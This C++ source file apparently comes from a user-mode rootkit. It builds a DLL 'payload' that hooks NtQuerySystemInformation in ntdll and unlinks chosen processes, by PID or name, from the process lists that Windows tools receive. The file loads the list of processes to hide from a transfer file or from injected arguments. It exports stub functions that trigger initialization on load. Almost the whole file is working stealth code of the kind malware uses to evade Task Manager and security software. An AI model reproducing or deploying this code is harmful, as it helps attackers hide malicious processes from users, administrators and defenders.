
#include "stdafx.h"

// x64Payload.cpp : Defines the exported functions for the DLL application.
//
#include "Payload.h"

#include "../NtHookEngine/Sources/NtHookEngine.h"
#ifdef DEBUG_MODE
#include <iostream>
#include <fstream>
#include <iomanip>
#include <string>

#endif

#include <wchar.h>
#include <Windows.h>


using namespace std;

#ifdef DEBUG_MODE
void PrintToFile(const char* s) //just for debugging purposes
{
	wofstream f;
	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
	f << s << endl;
	f.close();
}
void PrintToFile(const TCHAR* s)
{
	wofstream f;
	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
	f << s << endl;
	f.close();
}
#endif
int *hiddenPIDsList;
TCHAR **hiddenProcessNames;
int PIDsNum, procNameNum;
bool isUp = false;


PNtQueryFunc RealNTQueryFunc,OrigAddress;



HANDLE hMutex;

HMODULE GetCurrentModule()
{ // NB: XP+ solution!
	HMODULE hModule = NULL;
	GetModuleHandleEx(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
		(LPCTSTR)GetCurrentModule,
		&hModule);

	return hModule;
}
extern "C" __declspec(dllexport) wchar_t* WStringFunc()
{
	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
	return NULL;

}

extern "C" __declspec(dllexport) char* StringFunc()
{
	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
	return NULL;
}
extern "C" __declspec(dllexport) void VoidFunc(){
	DllMain(GetCurrentModule(), DLL_PROCESS_ATTACH, NULL);
}



BOOL wstrcmp_ignorecase(LPCWSTR a, LPCWSTR b) //easier to implement than use existing functions
{
	int i = 0;
	TCHAR ax = a[0], bx = b[0];
	const int caseDiff = 'a' - 'A';
	while (ax != 0 && bx != 0)
	{
		if (ax == 0 || bx == 0)
			return 1;
		if (!(ax == bx || ax == bx + caseDiff || ax + caseDiff == bx))
			return 1;
		i++;
		ax = a[i]; bx = b[i];
	}
	return 0;
}
BOOL isHiddenProcess(int pID, const TCHAR *name)
{
	for (int i = 0; i < PIDsNum; i++)
	{
		#ifdef DEBUG_MODE
		PrintToFile("Checking PID: ");
		char buff[10];
		sprintf_s(buff, 10, "%d", hiddenPIDsList[i]);
		PrintToFile(buff);
#endif
		if (hiddenPIDsList[i] == pID)
			return TRUE;
	}
	for (int i = 0; i < procNameNum; i++)
	{
#ifdef DEBUG_MODE
		PrintToFile("Checking Name:");
		PrintToFile(hiddenProcessNames[i]);
#endif
		if (!wstrcmp_ignorecase(name, hiddenProcessNames[i]))
			return TRUE;
	}
	return FALSE;

}

PSYSTEM_PROCESS_INFO getNextElement(PSYSTEM_PROCESS_INFO spi)
{
	return (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset);
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength
)
{
	NTSTATUS status = RealNTQueryFunc(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && NT_SUCCESS(status))
	{
		//
		// Loop through the list of processes
		//

		PSYSTEM_PROCESS_INFO pCurrent = NULL;
		PSYSTEM_PROCESS_INFO pNext = (PSYSTEM_PROCESS_INFO)SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (isHiddenProcess((int)pNext->ProcessId,pNext->ImageName.Buffer))
			{
				if (0 == pNext->NextEntryOffset)
				{
					pCurrent->NextEntryOffset = 0;
				}
				else
				{
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}

				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset != 0);
	}

	return status;
}


int buildPIDsList(const TCHAR *optarg, BOOL includeSelf, int **intBuffer)
{
	//returned value - number of PIDs in list
	TCHAR str_buffer[MAX_COMMAND], *context, *pwc, *delim = L",/";
	int sizeOfIntBuffer = sizeof(int)*(int)(1 + ceil(wcslen(optarg) / (float)2));
	*intBuffer = (int *)malloc((sizeOfIntBuffer));  //maximum ints is ceil(strlen(str)/2) is each pid is a digit, plus one for self
	int i = 0;
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	if (wcslen(optarg) == 0)
		return 0;
	if (includeSelf)
	{
		(*intBuffer)[i] = (int)GetCurrentProcessId();
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int x_buffer = _wtoi(pwc);
		if (x_buffer != 0)
		{
			(*intBuffer)[i] = x_buffer;
			i++;
		}
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}
int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuffer)
{
	TCHAR *str_buffer, *context, *pwc, *delim = L",";
	int i = 0, sizeOfStrBuffer = (int)sizeof(TCHAR)*(int)(wcslen(optarg) + 1);
	if (wcslen(optarg) == 0)
		return 0;
	*outStrBuffer = (TCHAR **)malloc(sizeof(TCHAR*)*wcslen(optarg));
	str_buffer = (TCHAR *)malloc(sizeOfStrBuffer);
	wcscpy_s(str_buffer, (wcslen(optarg) + 1), optarg);
	if (includeSelf)
	{
		TCHAR tmpSelfBuffer[MAX_PATH];
		GetModuleBaseName(GetCurrentProcess(), NULL, tmpSelfBuffer, sizeof(tmpSelfBuffer));
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(tmpSelfBuffer));
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(tmpSelfBuffer)), tmpSelfBuffer);
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(pwc));
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(pwc)), pwc);
		i++;
		pwc = wcstok_s(NULL, delim, &context);
	}
	free(str_buffer);
	return i;

}

void InitializeDLL(pArgStruct args)
{
	NtHookEngineInit();
	hMutex = CreateMutex(0, TRUE, NULL);
	if (args == NULL)
	{
		TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE];	
		FILE *fp;		 
			fopen_s(&fp, INFO_TRANSFER_FILE, "r");		
			fgetws(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide	
			fgetws(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide		
			pIDsbuff[wcslen(pIDsbuff) - 1] = '\0'; //delete \n		
			procNameBuff[wcslen(procNameBuff) - 1] = '\0';		
			fclose(fp);	
			PIDsNum = buildPIDsList(pIDsbuff, FALSE, &hiddenPIDsList);		
			procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);	
	}
	else
	{
		procNameNum = buildProcNameList(args->procNames, FALSE, &hiddenProcessNames);
		PIDsNum = args->pIDsNum;
		int hiddenPIDsListSize = sizeof(int)*PIDsNum;
		hiddenPIDsList = (int *)malloc(hiddenPIDsListSize);
		memcpy_s(hiddenPIDsList, hiddenPIDsListSize, args->pIDs, sizeof(int)*args->pIDsNum);
		#ifdef DEBUG_MODE
			PrintToFile("Line:");
			for (int i = 0; i < procNameNum; i++)
				PrintToFile(hiddenProcessNames[i]);
			PrintToFile("PIDs:");
			for (int i = 0; i < args->pIDsNum; i++)
			{
				char intbuf[10];
				_itoa_s(hiddenPIDsList[i], intbuf, 10, 10);
				PrintToFile(intbuf);
			}
		#endif // DEBUG_MODE
	}
	OrigAddress = (PNtQueryFunc)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	BOOL hookres = HookFunction((ULONG_PTR)OrigAddress, (ULONG_PTR)&HookedNtQuerySystemInformation);
	#ifdef DEBUG_MODE
		if (!hookres)
			PrintToFile("Hook Failed!");
	#endif
	RealNTQueryFunc = (PNtQueryFunc)GetOriginalFunction((ULONG_PTR)HookedNtQuerySystemInformation);
	ReleaseMutex(hMutex);
}
void UnhookDLL()
{
	UnhookFunction((ULONG_PTR)OrigAddress);
	free(hiddenPIDsList);
	for (int i = 0; i < procNameNum; i++)
		free(hiddenProcessNames[i]);
	free(hiddenProcessNames);
}
